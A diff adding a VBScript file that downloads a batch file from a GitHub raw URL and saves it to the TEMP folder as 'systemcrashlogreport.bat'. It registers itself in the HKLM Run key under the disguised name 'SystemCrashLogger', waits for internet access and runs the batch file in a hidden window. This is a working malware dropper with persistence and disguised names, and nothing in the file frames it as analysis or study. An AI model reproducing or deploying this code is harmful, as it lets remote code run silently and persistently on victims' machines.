@@ -1,0 +1,48 @@
+' Define the URL of the batch file and the temporary file location
+Dim objXMLHTTP, objFSO, objShell
+Dim tempFolder, tempBatFile, batchUrl, regKey
+
+batchUrl = "https://raw.githubusercontent.com/spooffewfe/yff/refs/heads/main/final-berlin.bat"
+Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")
+Set objFSO = CreateObject("Scripting.FileSystemObject")
+Set objShell = CreateObject("WScript.Shell")
+
+' Get the TEMP folder path and define the local batch file path
+tempFolder = objShell.ExpandEnvironmentStrings("%TEMP%")
+tempBatFile = tempFolder & "\systemcrashlogreport.bat"
+
+' Download the batch file from the cloud
+objXMLHTTP.Open "GET", batchUrl, False
+objXMLHTTP.Send
+
+If objXMLHTTP.Status = 200 Then
+    ' Save the batch file content to the TEMP folder
+    Dim objFile
+    Set objFile = objFSO.CreateTextFile(tempBatFile, True)
+    objFile.Write objXMLHTTP.ResponseText
+    objFile.Close
+
+    ' Add to Windows Startup (Runs on system startup with priority)
+    regKey = "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\SystemCrashLogger"
+    objShell.RegWrite regKey, "wscript.exe """ & WScript.ScriptFullName & """", "REG_SZ"
+
+    ' Wait for Internet Connection before running the batch file
+    Do
+        Set objPing = GetObject("winmgmts:{impersonationLevel=impersonate}").ExecQuery _
+            ("SELECT * FROM Win32_PingStatus WHERE Address = '8.8.8.8'")
+        For Each objStatus In objPing
+            If objStatus.StatusCode = 0 Then
+                objShell.Run "cmd.exe /c start /b """" " & tempBatFile, 0, False
+                Exit Do
+            End If
+        Next
+        WScript.Sleep 5000 ' Check every 5 seconds
+    Loop
+Else
+    ' Optionally handle download failure
+End If
+
+' Clean up
+Set objXMLHTTP = Nothing
+Set objFSO = Nothing
+Set objShell = Nothing
